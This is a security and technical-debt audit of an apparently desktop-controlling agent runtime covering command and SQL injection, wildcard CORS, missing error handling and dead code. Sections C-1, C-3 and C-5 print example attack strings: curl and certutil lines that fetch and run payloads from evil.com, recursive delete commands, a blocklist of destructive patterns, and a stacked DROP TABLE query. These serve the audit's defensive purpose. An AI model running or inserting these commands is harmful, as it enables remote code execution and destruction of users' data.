# Agent Runtime Core — Technical Debt Audit

**Scope**: All 26 Python files in `agent-runtime/core/` (~17,000+ lines)  
**Date**: 2025  
**Methodology**: Line-by-line static analysis of every file

---

## Executive Summary

The `agent-runtime/core/` directory contains a FastAPI-based agent execution engine that controls a Windows desktop via pyautogui. It supports multi-provider LLM integration, tiered agent capabilities (F through S+), collaborative multi-agent execution, and plugin-based agent loading.

**Critical problems found**: 6  
**High-severity issues**: 10  
**Medium-severity issues**: 14  
**Low-severity issues**: 8  

The most urgent issues are **command injection vulnerabilities** in 3 separate files and **complete absence of error handling** in 4 of 5 LLM client implementations. There is also significant **theater code** — modules that look impressive but do nothing meaningful at runtime.

---

## CRITICAL Severity

### C-1: Command Injection in `os_controller.py` `_run_command()`
**File**: `os_controller.py` lines ~880-920  
**Impact**: Remote code execution via LLM-generated commands

The `_run_command()` method uses `subprocess.Popen(cmd, shell=True)` with only a basic blocklist of 8 dangerous patterns (`rm -rf`, `format`, `del /s`, `shutdown`, `mkfs`, `:(){`, `> /dev/sda`, `dd if=`). This is trivially bypassed:

```python
# Bypasses:
"powershell -c Remove-Item -Recurse -Force C:\\"  # Not in blocklist
"curl http://evil.com/shell.sh | bash"              # Not in blocklist
"certutil -urlcache -split -f http://evil.com/x.exe x.exe && x.exe"  # Not in blocklist
```

The `_smart_open_app()` method also uses `subprocess.Popen(f'start {start_cmd}', shell=True)` which allows injection through app names.

**Fix**: Use allowlist-based command validation, not blocklist. Run commands without `shell=True` where possible. Sanitize all string interpolation.

---

### C-2: Command Injection in `tool_engine.py` `_run_command()`
**File**: `tool_engine.py` lines ~480-500  
**Impact**: Remote code execution

`tool_engine.py` has its own `_run_command()` that runs `subprocess.run(cmd, shell=True)` with **zero sanitization** — no blocklist at all:

```python
def _run_command(self, p: dict) -> str:
    cmd = p.get("command", "")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
```

This is a completely unprotected shell execution path.

**Fix**: Same as C-1. This is a duplicate code path that should be consolidated with `os_controller._run_command()`.

---

### C-3: Command Injection in `specialized_tools.py`
**File**: `specialized_tools.py` lines ~170-280  
**Impact**: Remote code execution via tool parameters

Multiple tools pass user-supplied parameters directly into shell commands:

- **`CodeSearchTool`**: `subprocess.run(f'grep -rn "{pattern}" {directory}', shell=True)` — `pattern` is user-supplied, allowing injection via `"; rm -rf /; #`
- **`CodeFormatTool`**: Runs arbitrary `formatter_cmd` as shell command
- **`ScheduleTaskTool`**: `schtasks /create /tn "{name}" /tr "{cmd}"` — both `name` and `cmd` are user-supplied
- **`ServiceManageTool`**: PowerShell commands with interpolated service name
- **`ProcessListTool`**: PowerShell with interpolated sort field
- **`AppLauncherTool`**: `subprocess.Popen(cmd, shell=True)` with derived cmd

**Fix**: Use `shlex.quote()` for all string interpolation, or pass arguments as lists to `subprocess.run()` without `shell=True`.

---

### C-4: No Error Handling in LLM API Clients
**File**: `llm_client.py` lines 1-265  
**Impact**: Unhandled exceptions crash entire execution session

4 of 5 LLM client implementations have **no try/except** around API calls:

```python
class OpenAIClient(LLMClient):
    async def chat(self, messages, screenshot_b64=None):
        # No try/except, no retry logic
        response = await self.client.chat.completions.create(...)
        return {"content": response.choices[0].message.content}

class AnthropicClient(LLMClient):
    async def chat(self, messages, screenshot_b64=None):
        # No try/except, no retry logic
        response = await self.client.messages.create(...)

class MistralClient(LLMClient):
    async def chat(self, messages, screenshot_b64=None):
        # No try/except, no retry logic
        response = await self.client.chat.completions.create(...)

class LocalClient(LLMClient):
    async def chat(self, messages, screenshot_b64=None):
        # No try/except, no retry logic
        response = await self.client.chat.completions.create(...)
```

Only `GoogleClient` has a try/except with sync fallback. Network timeouts, rate limits, auth failures, and malformed responses will all crash the execution loop.

**Fix**: Add retry logic with exponential backoff, proper exception handling, and timeout configuration to all clients.

---

### C-5: SQL Injection in `SQLQueryTool`
**File**: `specialized_tools.py` lines ~1000-1030  
**Impact**: Data exfiltration or corruption

The SQL safety check only blocks queries **starting** with DDL keywords:

```python
upper = query.strip().upper()
if any(upper.startswith(w) for w in ("DROP", "DELETE", "TRUNCATE", "ALTER")):
    return {"success": False, "error": "Destructive queries not allowed"}
# But this passes: "SELECT 1; DROP TABLE users;"
```

Any query containing DDL in a substatement, UNION-based injection, or `; DROP TABLE` bypasses this check.

**Fix**: Use parameterized queries exclusively. Consider using a read-only connection or `PRAGMA query_only = ON` for SQLite.

---

### C-6: Unauthenticated Execute Endpoint with Wildcard CORS
**File**: `main.py` (agent-runtime/main.py) lines ~40-50, ~120  
**Impact**: Any website can trigger agent execution on the user's machine

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # Any origin
    allow_methods=["*"],
)

@app.post("/execute")             # No authentication
async def execute_session(...):
```

Combined with the command injection vulnerabilities above, any malicious website could submit an execution request to the local agent runtime.

**Fix**: Restrict CORS to known origins. Add session token authentication to `/execute`. Consider binding to `127.0.0.1` only if not needed externally.

---

## HIGH Severity

### H-1: Theater Code — `tier_tools.py` SpecializedTool System (484 lines)
**File**: `tier_tools.py`  
**Impact**: Misleading code, maintenance burden, false complexity

The entire `tier_tools.py` defines a `SpecializedTool` class with impressive-looking attributes (`performance_multiplier`, `intelligence_requirement`, `evolution_potential`, `synergy_bonus`, `rarity`) and tools like `"ml_engine"`, `"system_architect"`, `"creative_synthesizer"`. However:

- **None of these tools have `execute()` methods** — they are data-only definitions
- The `evolve_tool()` method creates "evolved" copies with slightly better stats but doesn't change behavior
- The `optimize_tool_assignment()` method calculates scores but the scores aren't used by the actual execution engine
- There is a **naming conflict** with the real `SpecializedTool` class in `specialized_tools.py` (which actually has `execute()` methods)

The real tool execution goes through `specialized_tools.py` → `DOMAIN_TOOLS` registry. This file is dead weight.

---

### H-2: Theater Code — `adaptive_reasoning.py` (915 lines)
**File**: `adaptive_reasoning.py`  
**Impact**: Complexity theater, zero runtime impact

This 915-line file implements 11 "reasoning types" (DEDUCTIVE, INDUCTIVE, ABDUCTIVE, CAUSAL, ANALOGICAL, TEMPORAL, etc.) and 10 "command complexity" types. Every single method uses **regex keyword matching** to produce hardcoded strings:

```python
def _extract_general_rule(self, command: str) -> str:
    patterns = [r"all\s+(.+?)\s+(?:are|have|should)", ...]
    for pattern in patterns:
        match = re.search(pattern, command, re.IGNORECASE)
        if match:
            return match.group(0)
    return "General principle based on command context"  # Fallback

def _deduce_conclusion(self, general_rule, specific_case):
    return f"Applying {general_rule} to {specific_case}"  # Just string concat
```

The `apply_reasoning()` method is **never called** from `engine.py` or any other execution path. The entire file produces data structures that nobody consumes.

---

### H-3: Theater Code — `pricing_model.py` Fake Metrics (~220 lines)
**File**: `pricing_model.py`  
**Impact**: Misleading performance claims

The `get_performance_metrics()` function returns hardcoded "performance" numbers that aren't connected to any actual measurement:

```python
"learning_rate": tier_data.learning_rate,       # Hardcoded 0.01-0.20
"creativity_score": tier_data.creativity_score, # Hardcoded 0.1-1.0
"problem_solving_score": tier_data.problem_solving_score  # Hardcoded 0.1-1.0
```

These values are **constants** baked into `PRICING_TIERS` — they never change based on actual agent performance. They are consumed by `performance_tracker.py` and `agent_tool_manager.py` to create the illusion of dynamic pricing.

---

### H-4: Theater Code — `performance_tracker.py` (553 lines)
**File**: `performance_tracker.py`  
**Impact**: Unused complexity

This file implements elaborate `PerformanceTracker` and `PerformanceMetric` systems with intelligence scoring, tier recommendation, and price optimization. However:

- `record_performance()` is never called from `engine.py`, `collaboration_engine.py`, or `main.py`
- The metrics it tracks (`accuracy`, `efficiency`, `user_satisfaction`, `complexity_handled`) are never populated from actual execution data
- It imports from `pricing_model.py` which itself has fake metrics
- It duplicates functionality with `agent_tool_manager.py`'s `ToolProfiler`

---

### H-5: Theater Code — `tool_evolution.py` (1,113 lines)
**File**: `tool_evolution.py`  
**Impact**: Massive unnecessary complexity

This file implements a tool "evolution" system with Korean comments, combo systems, cooldown managers, mastery levels, and execution modifiers. While the v2.0 refactor claims to have "REAL" execution modifiers, the system is:

- Never invoked from the main execution loop in `engine.py`
- The evolution paths and combos are predefined constants, not learned from usage
- `ToolExecutionModifier` values are computed but never passed to actual tool executors in `specialized_tools.py`

Combined with `tier_tools.py` (H-1), this represents ~1,600 lines of code that does nothing at runtime.

---

### H-6: Collaboration `ActionLock` is Not Thread-Safe
**File**: `collaboration_engine.py` lines ~260-310  
**Impact**: Race conditions in multi-agent execution

The `ActionLock` is implemented as a polling loop checking a plain boolean:

```python
async def acquire_action_lock(self, agent_id: str, timeout: float = 5.0) -> bool:
    while time.time() - start < timeout:
        if not self.action_lock.is_locked:     # Read
            self.action_lock.holder = agent_id  # Write (no atomic guarantee)
            return True
```

Between the `if not is_locked` check and the `holder = agent_id` assignment, another coroutine can also acquire the "lock". While asyncio is single-threaded per event loop, `await asyncio.sleep(0.1)` in the loop yields control, allowing two agents to both conclude the lock is free and both proceed.

`is_locked` is a `@property` checking `self.holder is not None`, but the holder assignment is not atomic with the check.

**Fix**: Use `asyncio.Lock()` instead of manual polling.

---

### H-7: `learning_engine.py` Imports Unavailable Dependencies (901 lines)
**File**: `learning_engine.py`  
**Impact**: ImportError on startup if used

```python
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from sklearn.cluster import KMeans
```

`scikit-learn` and `numpy` are **not** in `requirements.txt`. If `learning_engine.py` is imported, it will crash. Currently this doesn't break the system because nothing imports it — making the entire 901-line file dead code.

---

### H-8: `dynamic_intelligence.py` Over-Engineering (1,276 lines)
**File**: `dynamic_intelligence.py`  
**Impact**: Complexity without proportional value

Implements 13 "ThinkingModes" (ANALYTICAL, CREATIVE, STRATEGIC, TACTICAL, ADAPTIVE, METACOGNITIVE, QUANTITATIVE, ETHICAL, SYSTEMS_THINKING, CREATIVE_SYNTHESIS, CRITICAL_THINKING, INTUITIVE, COLLABORATIVE) with a `MetacognitiveMonitor` and cognitive load estimation. Like `adaptive_reasoning.py`, all logic is keyword/regex-based string manipulation. Not called from the main execution path.

---

### H-9: Massive Prompt Duplication in System Prompts
**File**: `engine.py` lines ~2000-2400, `collaboration_engine.py` lines ~1640-1927  
**Impact**: ~800 lines of near-identical text, maintenance nightmare

`_build_system_prompt()` in `engine.py` and `_build_collab_system_prompt()` in `collaboration_engine.py` contain nearly identical copies of:
- Windows OS Mastery Guide
- Application launching instructions  
- Browser workflow
- Cognitive framework (OBSERVE/ORIENT/DECIDE/ACT/VERIFY)
- Action definitions
- Iron rules
- Visual decision tree

Any change to agent behavior requires editing two 400+ line prompt strings.

**Fix**: Extract shared prompt content into a common template module.

---

### H-10: Circular Import Between `engine.py` and `collaboration_engine.py`
**File**: Both files  
**Impact**: Fragile import structure, lazy imports, code duplication

`engine.py` imports `CollaborativeSession` from `collaboration_engine.py`.  
`collaboration_engine.py` needs `TaskType`, `TaskAnalyzer`, `TASK_STRATEGY_PROMPTS`, `BROWSER_GUIDE`, `COMPLETION_RULES`, `_is_ogenti_screen` from `engine.py`.

This is "resolved" with try/except at module level and re-import at runtime inside `_run_collaborative_agent()`. This has led to:
- A `HAS_TASK_INTELLIGENCE` flag that determines which import path to use
- Duplicated `VALID_ACTIONS` set in both files
- `_parse_actions()` implemented independently in both files (engine.py has a more sophisticated version)

**Fix**: Extract shared types (`TaskType`, `TaskAnalyzer`, `TASK_STRATEGY_PROMPTS`, etc.) into a separate `task_types.py` module.

---

## MEDIUM Severity

### M-1: Duplicate `loguru==0.7.2` in `requirements.txt`
**File**: `requirements.txt`

`loguru==0.7.2` appears twice.

---

### M-2: Missing Dependencies in `requirements.txt`
**File**: `requirements.txt`

Used but not declared:
- `pyperclip` — used in `os_controller.py`, `tool_engine.py`
- `pygetwindow` — used in `specialized_tools.py` (`WindowManagerTool`)
- `scikit-learn`, `numpy` — used in `learning_engine.py`
- `pytesseract` — used in `vision_engine.py`

---

### M-3: Duplicate `_run_command()` Implementations
**Files**: `os_controller.py`, `tool_engine.py`

Two separate `_run_command()` methods with different security postures. `os_controller.py` has a (weak) blocklist; `tool_engine.py` has none. Both use `shell=True`.

**Fix**: Consolidate into a single `run_command()` in `os_controller.py` with proper sanitization.

---

### M-4: Duplicate `SpecializedTool` Class Name
**Files**: `tier_tools.py`, `specialized_tools.py`

Both define a class called `SpecializedTool`. `agent_tool_manager.py` imports from `tier_tools.py`:
```python
from core.tier_tools import tier_tools_system, SpecializedTool, ToolCategory, ToolRarity
```

While `specialized_tools.py` has the working tools with `execute()`. This creates confusion and potential import conflicts.

**Fix**: Rename the `tier_tools.py` class to `TierToolDefinition` or remove it entirely.

---

### M-5: Duplicate `VALID_ACTIONS` Set
**Files**: `engine.py` line ~2340, `collaboration_engine.py` line ~1840

Identical 24-element sets defined independently. If a new action is added, both must be updated.

---

### M-6: Duplicate SoM Description Appended Twice
**File**: `collaboration_engine.py` lines ~1490-1500

```python
verify_parts.append(f"\n📍 CURRENT SCREEN ELEMENTS:\n{updated_som_desc}")
# ... ogenti detection block ...
verify_parts.append(f"\n📍 CURRENT SCREEN ELEMENTS:\n{updated_som_desc}")  # DUPLICATE
```

The SoM element description is appended to verification prompts twice, wasting LLM tokens.

---

### M-7: `_run_sequential` Has Wrong Indentation
**File**: `engine.py` lines ~1080-1130

The `for agent_data in agents:` loop body is indented with 16 spaces (4 extra levels) under a method that expects 8 spaces. While Python doesn't break on this, it suggests the code was copy-pasted from a different context.

```python
async def _run_sequential(self, session_id, prompt, agents, llm, config):
    """Legacy sequential execution: run each agent one by one."""
    for agent_data in agents:
            agent_id = agent_data.get("id", "unknown")  # Extra indent
            agent_name = agent_data.get("name", "Unknown Agent")  # Extra indent
```

---

### M-8: `replay_runner.py` Uses `__new__()` Hack
**File**: `replay_runner.py` lines ~30-40

```python
engine = ExecutionEngine.__new__(ExecutionEngine)
```

Creates an uninitialized `ExecutionEngine` instance, bypassing `__init__()`. Any access to uninitialized attributes will cause `AttributeError`. This is fragile.

**Fix**: Create a proper `ExecutionEngine.create_for_replay()` classmethod.

---

### M-9: `screen_analysis_collab` Used Before Defined
**File**: `collaboration_engine.py` line ~1450

```python
"screen_state": screen_analysis_collab.state.value if 'screen_analysis_collab' in dir() else "unknown",
```

Uses `'screen_analysis_collab' in dir()` to check if a local variable exists. This is a code smell indicating the variable is only defined inside a conditional branch that may not execute.

---

### M-10: `agent_tool_manager.py` Depends on Theater Modules
**File**: `agent_tool_manager.py` lines 1-30

```python
from core.tier_tools import tier_tools_system, SpecializedTool, ToolCategory, ToolRarity
from core.agent_registry import AGENT_REGISTRY, get_agent_profile
from core.pricing_model import get_performance_metrics
```

This 1,104-line file builds a real execution cache, profiler, and dependency graph — but layers them on top of the fake tier_tools system. The `RealToolExecutors` class actually does useful work (data processing, subprocess execution), but it's never wired into the main execution loop.

---

### M-11: Backup Files Left in Repository
**Files**: `agent_tool_manager.py.bak`, `dynamic_intelligence.py.bak`, `learning_engine.py.bak`, `tool_evolution.py.bak`

Four `.bak` files committed to the repository. These should be in `.gitignore` or removed.

---

### M-12: `_type_text()` Unicode Handling Is Platform-Dependent
**File**: `tool_engine.py` lines ~430-435

```python
pyautogui.typewrite(text, interval=interval) if text.isascii() else pyautogui.write(text)
```

`pyautogui.write()` uses a different mechanism on Windows, potentially producing incorrect characters. Korean text input (common given the Korean comments throughout) will likely fail.

---

### M-13: No Rate Limiting on Screenshot Capture
**File**: `engine.py`, `collaboration_engine.py`

While there is a configurable screenshot interval for *sending* screenshots to the backend, the actual capture + SoM processing (`_som.capture_som()`) runs on every step of the execution loop. With default `action_delay` of 0.5s for lower tiers, this is ~2 SoM captures per second, which is CPU-intensive.

---

### M-14: Unbounded Message History Growth
**File**: `collaboration_engine.py` `CollaborationBus`

`message_history` grows without bound:
```python
self.message_history.append(msg)  # No limit
```

In long-running collaborative sessions, this could consume significant memory.

---

## LOW Severity

### L-1: Korean Comments Mixed with English
**Files**: `agent_intelligence.py`, `tool_evolution.py`, `collaboration_engine.py`

Comments switch between Korean and English inconsistently, making the codebase harder to navigate for any monolingual developer.

---

### L-2: `__init__.py` Is Empty
**File**: `__init__.py`

Contains only `# Core module init`. No `__all__` exports defined, no public API.

---

### L-3: `memory_engine.py` Uses MD5 for Entry IDs
**File**: `memory_engine.py`

Uses `hashlib.md5()` for generating memory entry IDs. While not a security concern (these aren't cryptographic), MD5 has known collision issues.

---

### L-4: `TaskAnalyzer` Uses Keyword Scoring Instead of LLM
**File**: `engine.py` lines ~400-550

Task type detection uses naive keyword counting:
```python
if any(kw in prompt_lower for kw in ["search", "find", "research"]):
    scores[TaskType.RESEARCH] += 3
```

This misclassifies ambiguous prompts. The LLM itself would be better at classifying task types.

---

### L-5: `planner_engine.py` Templates Are Rigid
**File**: `planner_engine.py`

Plan templates for 6 task types are hardcoded. Any task type outside the 6 falls through to an LLM-generated plan, but the LLM fallback has no validation against the pre-built validator.

---

### L-6: `plugin_loader.py` Fuzzy Matching Could Return Wrong Plugin
**File**: `plugin_loader.py`

Fuzzy matching logic (`fuzz_match`) uses substring containment, which could match "research" to "research_assistant" but also to "deep_research_v2_beta". No disambiguation strategy.

---

### L-7: `vision_engine.py` OCR Requires Tesseract Installation
**File**: `vision_engine.py`

`pytesseract` is imported with a try/except, but the `ocr_screen()` method will silently return empty strings if Tesseract is not installed. There is no user-facing warning.

---

### L-8: No Logging Configuration
**File**: `main.py`, all files

All files use `from loguru import logger` but there's no configuration for log level, rotation, or output format. Default loguru behavior dumps everything to stderr.

---

## Dead Code Summary

| File | Lines | Status | Reason |
|------|-------|--------|--------|
| `tier_tools.py` | 484 | **DEAD** | No `execute()` on tools, never called from engine |
| `adaptive_reasoning.py` | 915 | **DEAD** | `apply_reasoning()` never called from execution path |
| `performance_tracker.py` | 553 | **DEAD** | `record_performance()` never called |
| `tool_evolution.py` | 1,113 | **DEAD** | Evolution system never invoked from engine |
| `dynamic_intelligence.py` | 1,276 | **DEAD** | ThinkingModes never used in execution |
| `learning_engine.py` | 901 | **DEAD** | Missing sklearn dependency, never imported |
| `agent_tool_manager.py.bak` | — | **DEAD** | Backup file |
| `dynamic_intelligence.py.bak` | — | **DEAD** | Backup file |
| `learning_engine.py.bak` | — | **DEAD** | Backup file |
| `tool_evolution.py.bak` | — | **DEAD** | Backup file |

**Total dead code**: ~5,242 lines (**~31% of the codebase**)

---

## Architecture Diagram (Actual Runtime Execution Path)

```
main.py (FastAPI)
  └─▶ engine.py (ExecutionEngine)
        ├─▶ llm_client.py (LLM providers)
        ├─▶ os_controller.py (OS actions)
        ├─▶ screenshot.py (screen capture)
        ├─▶ som_engine.py (UI element detection)
        ├─▶ semantic_som_engine.py (LLM fallback SoM)
        ├─▶ vision_engine.py (OCR, screen analysis)
        ├─▶ plugin_loader.py (agent plugins)
        ├─▶ agent_registry.py (agent profiles)
        │     ├─▶ tier_config.py (tier limits)
        │     ├─▶ specialized_tools.py (domain tools)  ← REAL tools
        │     └─▶ pricing_model.py (partial theater)
        ├─▶ agent_intelligence.py (screen classifier, auto-resolver)
        ├─▶ planner_engine.py (task planning)
        ├─▶ memory_engine.py (working/episodic/semantic memory)
        └─▶ collaboration_engine.py (multi-agent)
              └─▶ (re-imports from engine.py)

NOT IN EXECUTION PATH:
  ✗ tier_tools.py
  ✗ adaptive_reasoning.py
  ✗ performance_tracker.py
  ✗ tool_evolution.py
  ✗ dynamic_intelligence.py
  ✗ learning_engine.py
  ✗ agent_tool_manager.py (partially wired but not called)
```

---

## Recommendations (Priority Order)

1. **Fix all command injection vulnerabilities** (C-1, C-2, C-3) — switch to allowlist validation and `shell=False`
2. **Add error handling to LLM clients** (C-4) — retry with backoff, timeout configuration
3. **Add authentication to `/execute`** (C-6) — session tokens, restrict CORS
4. **Delete dead code** (H-1, H-2, H-4, H-5, H-8) — remove ~5,200 lines that do nothing
5. **Fix SQL injection** (C-5) — use `PRAGMA query_only` and parameterized queries
6. **Replace manual action lock** (H-6) — use `asyncio.Lock()`
7. **Extract shared prompts** (H-9) — deduplicate the 800 lines of prompt text
8. **Break circular import** (H-10) — extract `TaskType`/`TaskAnalyzer` into own module
9. **Fix `requirements.txt`** (M-1, M-2) — remove duplicate, add missing deps
10. **Remove `.bak` files** (M-11) — add to `.gitignore`
